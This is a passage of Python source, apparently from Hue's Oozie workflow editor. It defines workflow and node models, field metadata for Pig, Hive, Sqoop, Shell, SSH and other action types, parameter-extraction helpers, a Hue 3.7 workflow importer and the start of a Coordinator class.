parameters(self):\n    _data = self.get_data()\n    return _data['workflow']['properties']['parameters']\n\n  @property      \n  def sla_enabled(self):\n    _data = self.get_data()\n    return _data['workflow']['properties']['sla_enabled']\n\n  @property      \n  def sla(self):\n    _data = self.get_data()\n    return _data['workflow']['properties']['sla']\n\n  @property      \n  def nodes(self):\n    _data = self.get_data()\n    return [Node(node) for node in _data['workflow']['nodes']]\n\n  def find_parameters(self):\n    params = set()\n\n    if self.sla_enabled:\n      for param in find_json_parameters(self.sla):\n        params.add(param)\n\n    for node in self.nodes:\n      params.update(node.find_parameters())\n\n    return dict([(param, '') for param in list(params)])\n\n  def set_workspace(self, user):\n    _data = json.loads(self.data)\n\n    _data['workflow']['properties']['deployment_dir'] = Job.get_workspace(user)\n    \n    self.data = json.dumps(_data)\n\n  def check_workspace(self, fs, user):\n    # Create optional root workspace for the first submission    \n    root = REMOTE_SAMPLE_DIR.get().rsplit('/', 1)\n    if len(root) > 1 and '$' not in root[0]:      \n      create_directories(fs, [root[0]])\n\n    Submission(user, self, fs, None, {})._create_dir(self.deployment_dir)\n    Submission(user, self, fs, None, {})._create_dir(Hdfs.join(self.deployment_dir, 'lib'))\n\n\nclass Node():\n  def __init__(self, data):    \n    self.data = data\n    \n    self._augment_data()\n    \n  def to_xml(self, mapping=None, node_mapping=None, workflow_mapping=None):\n    if mapping is None:\n      mapping = {}\n    if node_mapping is None:\n      node_mapping = {}\n    if workflow_mapping is None:\n      workflow_mapping = {}\n\n    data = {\n      'node': self.data,\n      'mapping': mapping,\n      'node_mapping': node_mapping,\n      'workflow_mapping': workflow_mapping\n    }\n\n    return django_mako.render_to_string(self.get_template_name(), data)\n\n  @property      \n  def id(self):\n    return self.data['id']\n  \n  @property      \n  def name(self):\n    return self.data['name']\n\n  @property      \n  def sla_enabled(self):\n    _data = self.get_data()\n    return _data['workflow']['properties']['sla_enabled']\n\n  def _augment_data(self):\n    self.data['type'] = self.data['type'].replace('-widget', '')\n    self.data['uuid'] = self.data['id']\n    \n    # Action Node\n    if 'credentials' not in self.data['properties']:\n      self.data['properties']['credentials'] = []     \n    if 'prepares' not in self.data['properties']:\n      self.data['properties']['prepares'] = []\n    if 'job_xml' not in self.data['properties']:\n      self.data['properties']['job_xml'] = []      \n    if 'properties' not in self.data['properties']:\n      self.data['properties']['properties'] = []\n    if 'params' not in self.data['properties']:\n      self.data['properties']['params'] = []\n    if 'files' not in self.data['properties']:\n      self.data['properties']['files'] = []\n    if 'archives' not in self.data['properties']:\n      self.data['properties']['archives'] = []\n    if 'sla_enabled' not in self.data['properties']:\n      self.data['properties']['sla_enabled'] = False\n    if 'sla' not in self.data['properties']:\n      self.data['properties']['sla'] = []\n    \n  def get_template_name(self):\n    return 'editor/gen2/workflow-%s.xml.mako' % self.data['type']    \n\n  def find_parameters(self):\n    return find_parameters(self)    \n\n\nclass Action(object):\n  \n  @classmethod\n  def get_fields(cls):\n    return [(f['name'], f['value']) for f in cls.FIELDS.itervalues()] + [('sla', Workflow.SLA_DEFAULT), ('credentials', [])]\n\n\nclass StartNode(Action):\n  TYPE = 'start'\n  FIELDS = {}\n\n\nclass EndNode(Action):\n  TYPE = 'end'\n  FIELDS = {}\n\n\nclass PigAction(Action):\n  TYPE = 'pig'\n  FIELDS = {\n     'script_path': { \n          'name': 'script_path',\n          'label': _('Script'),\n          'value': '',\n          'help_text': _('Path to the script on HDFS.'),\n          'type': ''\n     },            \n     'parameters': { \n          'name': 'parameters',\n          'label': _('Parameters'),\n          'value': [],\n          'help_text': _('The Pig parameters of the script without -param. e.g. INPUT=${inputDir}'),\n          'type': ''\n     },\n     'arguments': { \n          'name': 'arguments',\n          'label': _('Arguments'),\n          'value': [],\n          'help_text': _('The Pig parameters of the script as is. e.g. -param, INPUT=${inputDir}'),\n          'type': ''\n     },\n     # Common\n     'files': { \n          'name': 'files',\n          'label': _('Files'),\n          'value': [],\n          'help_text': _('Files put in the running directory.'),\n          'type': ''\n     },\n     'archives': { \n          'name': 'archives',\n          'label': _('Archives'),\n          'value': [],\n          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),\n          'type': ''\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production'),\n          'type': ''\n     },\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.'),\n          'type': ''\n     },\n     'job_xml': { \n          'name': 'job_xml',\n          'label': _('Job XML'),\n          'value': [],\n          'help_text': _('Refer to a Hadoop JobConf job.xml'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['script_path']]\n\n\nclass JavaAction(Action):\n  TYPE = 'java'\n  FIELDS = {\n     'jar_path': { \n          'name': 'jar_path',\n          'label': _('Jar name'),\n          'value': '',\n          'help_text': _('Path to the jar on HDFS.'),\n          'type': ''\n     },            \n     'main_class': { \n          'name': 'main_class',\n          'label': _('Main class'),\n          'value': '',\n          'help_text': _('Java class. e.g. org.apache.hadoop.examples.Grep'),\n          'type': 'text'\n     },\n     'arguments': { \n          'name': 'arguments',\n          'label': _('Arguments'),\n          'value': [],\n          'help_text': _('Arguments of the main method. The value of each arg element is considered a single argument '\n                         'and they are passed to the main method in the same order.'),\n          'type': ''\n     },\n     'java_opts': { \n          'name': 'java_opts',\n          'label': _('Java options'),\n          'value': [],\n          'help_text': _('Parameters for the JVM, e.g. -Dprop1=a -Dprop2=b'),\n          'type': ''\n     },\n     'capture_output': { \n          'name': 'capture_output',\n          'label': _('Capture output'),\n          'value': False,\n          'help_text': _('Capture output of the stdout of the %(program)s command execution. The %(program)s '\n                         'command output must be in Java Properties file format and it must not exceed 2KB. '\n                         'From within the workflow definition, the output of an %(program)s action node is accessible '\n                         'via the String action:output(String node, String key) function') % {'program': TYPE.title()},\n          'type': ''\n     },\n     # Common\n     'files': { \n          'name': 'files',\n          'label': _('Files'),\n          'value': [],\n          'help_text': _('Files put in the running directory.'),\n          'type': ''\n     },\n     'archives': { \n          'name': 'archives',\n          'label': _('Archives'),\n          'value': [],\n          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),\n          'type': ''\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production'),\n          'type': ''\n     },\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.'),\n          'type': ''\n     },\n     'job_xml': { \n          'name': 'job_xml',\n          'label': _('Job XML'),\n          'value': [],\n          'help_text': _('Refer to a Hadoop JobConf job.xml'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['jar_path'], cls.FIELDS['main_class']]\n  \n  \nclass HiveAction(Action):\n  TYPE = 'hive'\n  FIELDS = {\n     'script_path': { \n          'name': 'script_path',\n          'label': _('Script'),\n          'value': '',\n          'help_text': _('Path to the script on HDFS.'),\n          'type': ''\n     },            \n     'parameters': { \n          'name': 'parameters',\n          'label': _('Parameters'),\n          'value': [],\n          'help_text': _('The %(type)s parameters of the script. E.g. N=5, INPUT=${inputDir}')  % {'type': TYPE.title()},\n          'type': ''\n     },\n     # Common\n     'files': { \n          'name': 'files',\n          'label': _('Files'),\n          'value': [],\n          'help_text': _('Files put in the running directory.'),\n          'type': ''\n     },\n     'archives': { \n          'name': 'archives',\n          'label': _('Archives'),\n          'value': [],\n          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),\n          'type': ''\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production'),\n          'type': ''\n     },\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.'),\n          'type': ''\n     },\n     'hive_xml': { \n          'name': 'hive_xml',\n          'label': _('Hive XML'),\n          'value': [],\n          'help_text': _('Refer to a hive-site.xml renamed hive-conf.xml'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['script_path'], cls.FIELDS['hive_xml']]\n\n\nclass HiveServer2Action(Action):\n  TYPE = 'hive2'\n  FIELDS = {\n     'script_path': { \n          'name': 'script_path',\n          'label': _('Script'),\n          'value': '',\n          'help_text': _('Path to the script on HDFS.'),\n          'type': ''\n     },            \n     'parameters': { \n          'name': 'parameters',\n          'label': _('Parameters'),\n          'value': [],\n          'help_text': _('The %(type)s parameters of the script. E.g. N=5, INPUT=${inputDir}')  % {'type': TYPE.title()},\n          'type': ''\n     },\n     # Common\n     'jdbc_url': { \n          'name': 'jdbc_url',\n          'label': _('JDBC URL'),\n          'value': 'jdbc:hive2://localhost:10000/default',\n          'help_text': _('JDBC URL for the Hive Server 2. Beeline will use this to know where to connect to.'),\n          'type': ''\n     },     \n     'password': { \n          'name': 'password',\n          'label': _('Password'),\n          'value': '',\n          'help_text': _('The password element must contain the password of the current user. However, the password is only used if Hive Server 2 is backed by '\n                         'something requiring a password (e.g. LDAP); non-secured Hive Server 2 or Kerberized Hive Server 2 don\\'t require a password.'),\n          'type': ''\n     },\n     'files': { \n          'name': 'files',\n          'label': _('Files'),\n          'value': [],\n          'help_text': _('Files put in the running directory.'),\n          'type': ''\n     },\n     'archives': { \n          'name': 'archives',\n          'label': _('Archives'),\n          'value': [],\n          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),\n          'type': ''\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production'),\n          'type': ''\n     },\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.'),\n          'type': ''\n     },\n     'job_xml': { \n          'name': 'job_xml',\n          'label': _('Job XML'),\n          'value': [],\n          'help_text': _('Refer to a Hadoop JobConf job.xml'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['script_path']]\n\n\nclass SubWorkflowAction(Action):\n  TYPE = 'subworkflow'\n  FIELDS = {\n     'workflow': { \n          'name': 'workflow',\n          'label': _('Sub-workflow'),\n          'value': None,\n          'help_text': _('The sub-workflow application to include. You must own all the sub-workflows'),\n          'type': 'workflow'\n     },\n     'propagate_configuration': { \n          'name': 'propagate_configuration',\n          'label': _('Propagate configuration'),\n          'value': True,\n          'help_text': _('If the workflow job configuration should be propagated to the child workflow.'),\n          'type': ''\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('Can be used to specify the job properties that are required to run the child workflow job.'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['workflow']] \n\n\nclass SqoopAction(Action):\n  TYPE = 'sqoop'\n  FIELDS = {\n     'command': { \n          'name': 'command',\n          'label': _('Sqoop command'),\n          'value': 'import  --connect jdbc:hsqldb:file:db.hsqldb --table TT --target-dir hdfs://localhost:8020/user/foo -m 1',\n          'help_text': _('The full %(type)s command. Either put it here or split it by spaces and insert the parts as multiple parameters below.') % {'type': TYPE},\n          'type': 'textarea'\n     },            \n     'parameters': { \n          'name': 'parameters',\n          'label': _('Arguments'),\n          'value': [],\n          'help_text': _('If no command is specified, split the command by spaces and insert the %(type)s parameters '\n                         'here e.g. import, --connect, jdbc:hsqldb:file:db.hsqldb, ...') % {'type': TYPE},\n          'type': ''\n     },\n     # Common\n     'files': { \n          'name': 'files',\n          'label': _('Files'),\n          'value': [],\n          'help_text': _('Files put in the running directory.'),\n          'type': ''\n     },\n     'archives': { \n          'name': 'archives',\n          'label': _('Archives'),\n          'value': [],\n          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),\n          'type': ''\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production'),\n          'type': ''\n     },\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.'),\n          'type': ''\n     },\n     'job_xml': { \n          'name': 'job_xml',\n          'label': _('Job XML'),\n          'value': [],\n          'help_text': _('Refer to a Hadoop JobConf job.xml'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['command']]\n\n\nclass MapReduceAction(Action):\n  TYPE = 'mapreduce'\n  FIELDS = {\n     'jar_path': { \n          'name': 'jar_path',\n          'label': _('Jar name'),\n          'value': '',\n          'help_text': _('Path to the jar on HDFS.'),\n          'type': ''\n     },\n     # Common\n     'files': { \n          'name': 'files',\n          'label': _('Files'),\n          'value': [],\n          'help_text': _('Files put in the running directory.'),\n          'type': ''\n     },\n     'archives': { \n          'name': 'archives',\n          'label': _('Archives'),\n          'value': [],\n          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),\n          'type': ''\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production'),\n          'type': ''\n     },\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.'),\n          'type': ''\n     },\n     'job_xml': { \n          'name': 'job_xml',\n          'label': _('Job XML'),\n          'value': [],\n          'help_text': _('Refer to a Hadoop JobConf job.xml'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['jar_path']]\n\n\nclass ShellAction(Action):\n  TYPE = 'shell' \n  FIELDS = {\n     'shell_command': { \n          'name': 'shell_command',\n          'label': _('Shell command'),\n          'value': '',\n          'help_text': _('Shell command to execute, e.g script.sh'),\n          'type': ''\n     },            \n     'arguments': {\n          'name': 'arguments',\n          'label': _('Arguments'),\n          'value': [],\n          'help_text': _('One arg, e.g. -l, --help'),\n          'type': ''\n     },    \n     'env_var': { \n          'name': 'env_var',\n          'label': _('Environment variables'),\n          'value': [],\n          'help_text': _('e.g. MAX=10 or PATH=$PATH:mypath'),\n          'type': ''\n     },         \n     'capture_output': { \n          'name': 'capture_output',\n          'label': _('Capture output'),\n          'value': True,\n          'help_text': _('Capture output of the stdout of the %(program)s command execution. The %(program)s '\n                         'command output must be in Java Properties file format and it must not exceed 2KB. '\n                         'From within the workflow definition, the output of an %(program)s action node is accessible '\n                         'via the String action:output(String node, String key) function') % {'program': TYPE},\n          'type': ''\n     },\n     # Common\n     'files': { \n          'name': 'files',\n          'label': _('Files'),\n          'value': [],\n          'help_text': _('Files put in the running directory.'),\n          'type': ''\n     },\n     'archives': { \n          'name': 'archives',\n          'label': _('Archives'),\n          'value': [],\n          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),\n          'type': ''\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production'),\n          'type': ''\n     },\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.'),\n          'type': ''\n     },\n     'job_xml': { \n          'name': 'job_xml',\n          'label': _('Job XML'),\n          'value': [],\n          'help_text': _('Refer to a Hadoop JobConf job.xml'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['shell_command']]\n\n\nclass SshAction(Action):\n  TYPE = 'ssh' \n  FIELDS = {\n     'host': { \n          'name': 'host',\n          'label': _('User and Host'),\n          'value': 'user@host.com',\n          'help_text': _('Where the shell will be executed.'),\n          'type': 'text'\n     },         \n     'ssh_command': { \n          'name': 'ssh_command',\n          'label': _('Ssh command'),\n          'value': 'ls',\n          'help_text': _('The path of the Shell command to execute.'),\n          'type': 'textarea'\n     },    \n     'arguments': {\n          'name': 'arguments',\n          'label': _('Arguments'),\n          'value': [],\n          'help_text': _('One arg, e.g. -l, --help'),\n          'type': ''\n     },\n     'capture_output': { \n          'name': 'capture_output',\n          'label': _('Capture output'),\n          'value': True,\n          'help_text': _('Capture output of the stdout of the %(program)s command execution. The %(program)s '\n                         'command output must be in Java Properties file format and it must not exceed 2KB. '\n                         'From within the workflow definition, the output of an %(program)s action node is accessible '\n                         'via the String action:output(String node, String key) function') % {'program': TYPE},\n          'type': ''\n     },\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['host'], cls.FIELDS['ssh_command']]\n\n\nclass FsAction(Action):\n  TYPE = 'fs' \n  FIELDS = {\n     'deletes': { \n          'name': 'deletes',\n          'label': _('Delete path'),\n          'value': [],\n          'help_text': _('Deletes recursively all content.'),\n          'type': ''\n     },\n     'mkdirs': { \n          'name': 'mkdirs',\n          'label': _('Create directory'),\n          'value': [],\n          'help_text': _('Sub directories are created if needed.'),\n          'type': ''\n     },\n     'moves': { \n          'name': 'moves',\n          'label': _('Move file or directory'),\n          'value': [],\n          'help_text': _('Destination.'),\n          'type': ''\n     },  \n     'chmods': { \n          'name': 'chmods',\n          'label': _('Change permissions'),\n          'value': [],\n          'help_text': _('File or directory.'),\n          'type': ''\n     },\n     'touchzs': { \n          'name': 'touchzs',\n          'label': _('Create or touch a file'),\n          'value': [],\n          'help_text': _('Or update its modification date.'),\n          'type': ''\n     },\n     'chgrps': { \n          'name': 'chgrps',\n          'label': _('Change the group'),\n          'value': [],\n          'help_text': _('File or directory.'),\n          'type': ''\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['deletes'], cls.FIELDS['mkdirs'], cls.FIELDS['moves'], cls.FIELDS['chmods']]\n\n\nclass EmailAction(Action):\n  TYPE = 'email' \n  FIELDS = {\n     'to': { \n          'name': 'to',\n          'label': _('To addresses'),\n          'value': '',\n          'help_text': _('Comma-separated values'),\n          'type': 'text'\n     },         \n     'cc': { \n          'name': 'cc',\n          'label': _('Cc addresses (optional)'),\n          'value': '',\n          'help_text': _('Comma-separated values'),\n          'type': 'text'\n     },    \n     'subject': {\n          'name': 'subject',\n          'label': _('Subject'),\n          'value': '',\n          'help_text': _('Plain-text'),\n          'type': 'text'\n     },\n     'body': { \n          'name': 'body',\n          'label': _('Body'),\n          'value': '',\n          'help_text': _('Plain-text'),\n          'type': 'textarea'\n     },\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['to'], cls.FIELDS['subject'], cls.FIELDS['body']]\n\n\nclass StreamingAction(Action):\n  TYPE = 'streaming'\n  FIELDS = {\n     'mapper': { \n          'name': 'mapper',\n          'label': _('Mapper'),\n          'value': '',\n          'help_text': _('The executable/script to be used as mapper.'),\n          'type': ''\n     },\n     'reducer': { \n          'name': 'reducer',\n          'label': _('Reducer'),\n          'value': '',\n          'help_text': _('The executable/script to be used as reducer.'),\n          'type': ''\n     },\n     # Common\n     'files': { \n          'name': 'files',\n          'label': _('Files'),\n          'value': [],\n          'help_text': _('Files put in the running directory.')\n     },\n     'archives': { \n          'name': 'archives',\n          'label': _('Archives'),\n          'value': [],\n          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.')\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production')\n     },\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.')\n     },\n     'job_xml': { \n          'name': 'job_xml',\n          'label': _('Job XML'),\n          'value': [],\n          'help_text': _('Refer to a Hadoop JobConf job.xml')\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['mapper'], cls.FIELDS['reducer']]\n\n\nclass DistCpAction(Action):\n  TYPE = 'distcp'\n  FIELDS = {\n     'distcp_parameters': { \n          'name': 'distcp_parameters',\n          'label': _('Arguments'),\n          'value': [{'value': ''}, {'value': ''}],\n          'help_text': _('Options first, then source / destination paths'),\n          'type': 'distcp'\n     },\n      # Common\n     'prepares': { \n          'name': 'prepares',\n          'label': _('Prepares'),\n          'value': [],\n          'help_text': _('Path to manipulate before starting the application.')\n     },\n     'job_properties': { \n          'name': 'job_properties',\n          'label': _('Hadoop job properties'),\n          'value': [],\n          'help_text': _('value, e.g. production')\n     },\n     'java_opts': { \n          'name': 'java_opts',\n          'label': _('Java options'),\n          'value': '',\n          'help_text': _('Parameters for the JVM, e.g. -Dprop1=a -Dprop2=b')\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['distcp_parameters']]\n\n\nclass KillAction(Action):\n  TYPE = 'kill'\n  FIELDS = {\n     'message': { \n          'name': 'message',\n          'label': _('Message'),\n          'value': _('Action failed, error message[${wf:errorMessage(wf:lastErrorNode())}]'),\n          'help_text': _('Message to display when the workflow fails. Can contain some EL functions.'),\n          'type': 'textarea'\n     }\n  }\n\n  @classmethod\n  def get_mandatory_fields(cls):\n    return [cls.FIELDS['message']]\n\n\nclass JoinAction(Action):\n  TYPE = 'join'\n  FIELDS = {}\n  \n  @classmethod\n  def get_mandatory_fields(cls):\n    return []\n\n\nclass ForkNode(Action):\n  TYPE = 'fork'\n  FIELDS = {}\n  \n  @classmethod\n  def get_mandatory_fields(cls):\n    return []\n\n\nclass DecisionNode(Action):\n  TYPE = 'decision'\n  FIELDS = {}\n  \n  @classmethod\n  def get_mandatory_fields(cls):\n    return []\n  \n\nNODES = {\n  'start-widget': StartNode,\n  'end-widget': EndNode,\n  'pig-widget': PigAction,\n  'java-widget': JavaAction,\n  'hive-widget': HiveAction,\n  'hive2-widget': HiveServer2Action,\n  'sqoop-widget': SqoopAction,\n  'mapreduce-widget': MapReduceAction,  \n  'subworkflow-widget': SubWorkflowAction,\n  'shell-widget': ShellAction,\n  'ssh-widget': SshAction,  \n  'fs-widget': FsAction,\n  'email-widget': EmailAction,\n  'streaming-widget': StreamingAction,\n  'distcp-widget': DistCpAction,  \n  'kill-widget': KillAction,\n  'join-widget': JoinAction,\n  'fork-widget': ForkNode,\n  'decision-widget': DecisionNode,  \n}\n\n\nWORKFLOW_NODE_PROPERTIES = {}\nfor node in NODES.itervalues():\n  WORKFLOW_NODE_PROPERTIES.update(node.FIELDS)\n\n\n\ndef find_parameters(instance, fields=None):\n  \"\"\"Find parameters in the given fields\"\"\"\n  if fields is None:\n    fields = NODES['%s-widget' % instance.data['type']].FIELDS.keys()\n\n  params = []\n  for field in fields:\n    data = instance.data['properties'][field]\n    if field == 'sla' and not instance.sla_enabled:\n      continue\n    if isinstance(data, list):\n      params.extend(find_json_parameters(data))\n    elif isinstance(data, basestring):\n      for match in Template.pattern.finditer(data):\n        name = match.group('braced')\n        if name is not None:\n          params.append(name)\n\n  return params\n\ndef find_json_parameters(fields):\n  # Input is list of json dict\n  params = []\n\n  for field in fields:\n    for data in field.values():\n      if isinstance(data, basestring):\n        for match in Template.pattern.finditer(data):\n          name = match.group('braced')\n          if name is not None:\n            params.append(name)\n\n  return params\n\ndef find_dollar_variables(text):\n  return re.findall('[^\\n\\\\\\\\]\\$([^\\{ \\'\\\"\\-;\\(\\)]+)', text, re.MULTILINE)  \n\ndef find_dollar_braced_variables(text):\n  vars = set()\n  \n  for var in re.findall('\\$\\{(.+)\\}', text, re.MULTILINE):  \n    if ':' in var:\n      var = var.split(':', 1)[1]    \n    vars.add(var)\n  \n  return list(vars) \n\n\n\n\ndef import_workflows_from_hue_3_7():\n  return import_workflow_from_hue_3_7(OldWorflows.objects.filter(managed=True).filter(is_trashed=False)[12].get_full_node())\n\n\ndef import_workflow_from_hue_3_7(old_wf):\n  \"\"\"\n  Example of data to transform\n\n  [<Start: start>, <Pig: Pig>, [<Kill: kill>], [<End: end>]]\n  [<Start: start>, <Java: TeraGenWorkflow>, <Java: TeraSort>, [<Kill: kill>], [<End: end>]]\n  [<Start: start>, [<Fork: fork-34>, [[<Mapreduce: Sleep-1>, <Mapreduce: Sleep-10>], [<Mapreduce: Sleep-5>, [<Fork: fork-38>, [[<Mapreduce: Sleep-3>], [<Mapreduce: Sleep-4>]], <Join: join-39>]]], <Join: join-35>], [<Kill: kill>], [<End: end>]]\n  \"\"\"\n  \n  uuids = {}\n\n  old_nodes = old_wf.get_hierarchy()\n  \n  wf = Workflow()\n  wf_rows = []\n  wf_nodes = []\n  \n  data = wf.get_data()\n  \n  # UUIDs node mapping\n  for node in old_wf.node_list:    \n    if node.name == 'kill':\n      node_uuid = '17c9c895-5a16-7443-bb81-f34b30b21548'\n    elif node.name == 'start':\n      node_uuid = '3f107997-04cc-8733-60a9-a4bb62cebffc'\n    elif node.name == 'end':\n      node_uuid = '33430f0f-ebfa-c3ec-f237-3e77efa03d0a'\n    else:\n      node_uuid = str(uuid.uuid4())\n\n    uuids[node.id] = node_uuid\n    \n  # Workflow\n  data['workflow']['uuid'] = str(uuid.uuid4())\n  data['workflow']['name'] = old_wf.name\n  data['workflow']['properties']['properties'] = json.loads(old_wf.job_properties)\n  data['workflow']['properties']['job_xml'] = old_wf.job_xml\n  data['workflow']['properties']['description'] = old_wf.description\n  data['workflow']['properties']['schema_version'] = old_wf.schema_version\n  data['workflow']['properties']['deployment_dir'] = old_wf.deployment_dir\n  data['workflow']['properties']['parameters'] = json.loads(old_wf.parameters)\n  data['workflow']['properties']['description'] = old_wf.description\n  data['workflow']['properties']['sla'] = old_wf.sla\n  data['workflow']['properties']['sla_enabled'] = old_wf.sla_enabled\n      \n  # Layout\n  rows = data['layout'][0]['rows']\n  \n  def _create_layout(nodes, size=12):\n    wf_rows = []\n    \n    for node in nodes:      \n      if type(node) == list and len(node) == 1:\n        node = node[0]\n      if type(node) != list:\n        if node.node_type != 'kill': # No kill widget displayed yet\n          wf_rows.append({\"widgets\":[{\"size\":size, \"name\": node.name.title(), \"id\":  uuids[node.id], \"widgetType\": \"%s-widget\" % node.node_type, \"properties\":{}, \"offset\":0, \"isLoading\":False, \"klass\":\"card card-widget span%s\" % size, \"columns\":[]}]})\n      else:\n        if node[0].node_type == 'fork':\n          wf_rows.append({\"widgets\":[{\"size\":size, \"name\": 'Fork', \"id\":  uuids[node[0].id], \"widgetType\": \"%s-widget\" % node[0].node_type, \"properties\":{}, \"offset\":0, \"isLoading\":False, \"klass\":\"card card-widget span%s\" % size, \"columns\":[]}]})  \n          \n          wf_rows.append({  \n            \"id\": str(uuid.uuid4()),\n            \"widgets\":[  \n\n            ],\n            \"columns\":[  \n               {  \n                  \"id\": str(uuid.uuid4()),\n                  \"size\": (size / len(node[1])),\n                  \"rows\": \n                     [{  \n                        \"id\": str(uuid.uuid4()),\n                        \"widgets\": c['widgets'],\n                        \"columns\":[]\n                      } \n                    for c in col] if type(col) == list else [{  \n                        \"id\": str(uuid.uuid4()),\n                        \"widgets\": col['widgets'],\n                        \"columns\":[]\n                      }\n                   ] \n                  ,                  \n                  \"klass\":\"card card-home card-column span%s\" % (size / len(node[1]))\n               }\n               for col in _create_layout(node[1], size)\n            ]\n          })\n          \n          wf_rows.append({\"widgets\":[{\"size\":size, \"name\": 'Join', \"id\":  uuids[node[2].id], \"widgetType\": \"%s-widget\" % node[2].node_type, \"properties\":{}, \"offset\":0, \"isLoading\":False, \"klass\":\"card card-widget span%s\" % size, \"columns\":[]}]})\n        else:\n          wf_rows.append(_create_layout(node, size))\n    \n    return wf_rows\n  \n  wf_rows = _create_layout(old_nodes[1:-1])\n    \n  if wf_rows:\n    data['layout'][0]['rows'] = [data['layout'][0]['rows'][0]] + wf_rows + [data['layout'][0]['rows'][-1]]\n\n\n  # Content\n  def _dig_nodes(nodes):\n    for node in nodes:\n      if type(node) != list:\n        properties = {}\n        if '%s-widget' % node.node_type in NODES and node.node_type != 'kill-widget':\n          properties = dict(NODES['%s-widget' % node.node_type].get_fields())\n        \n        if node.node_type == 'pig-widget':\n          properties['script_path'] = node.script_path\n          properties['params'] = json.loads(node.params)\n          properties['files'] = json.loads(node.files)\n          properties['archives'] = json.loads(node.archives)\n          properties['job_properties'] = json.loads(node.archives)          \n          properties['prepares'] = json.loads(node.prepares)\n          properties['job_xml'] = node.job_xml\n          properties['description'] = node.description\n          properties['sla'] = node.sla\n          properties['sla_enabled'] = node.sla_enabled\n\n        wf_nodes.append({\n            \"id\": uuids[node.id],\n            \"name\": '%s-%s' % (node.node_type.split('-')[0], uuids[node.id][:4]),\n            \"type\": \"%s-widget\" % node.node_type,\n            \"properties\": properties,\n            \"children\":[{('to' if link.name in ('ok', 'start') else link.name): uuids[link.child.get_full_node().id]} for link in node.get_children_links()]\n        })\n      else:\n        _dig_nodes(node)\n\n  _dig_nodes(old_nodes)\n  \n  data['workflow']['nodes'] = wf_nodes\n\n  return Workflow(data=json.dumps(data))\n\n\n\nclass Coordinator(Job):\n  XML_FILE_NAME = 'coordinator.xml'\n  PROPERTY_APP_PATH = 'oozie.coord.application.path'\n  HUE_ID = 'hue-id-c'\n\n  def __init__(self, data=None, json_data=None, document=None):\n    self.document = document\n\n    if document is not None:\n      self._data = json.loads(document.data)\n    elif json_data is not None:\n      self._data = json.loads(json_data)\n    elif data is not None:\n      self._data = data\n    else:\n      self._data = {\n          'id': None, \n          'uuid': None,\n          'name': 'My Coordinator',\n          'variables': [],\n          'properties': {\n              'deployment_dir': '',\n              'schema_version': 'uri:oozie:coordinator:0.2',\n              'frequency_number': 1,\n              'frequency_unit': 'days',\n              'cron_frequency': '0 0 * * *',\n              'cron_advanced': False,\n              'timezone': 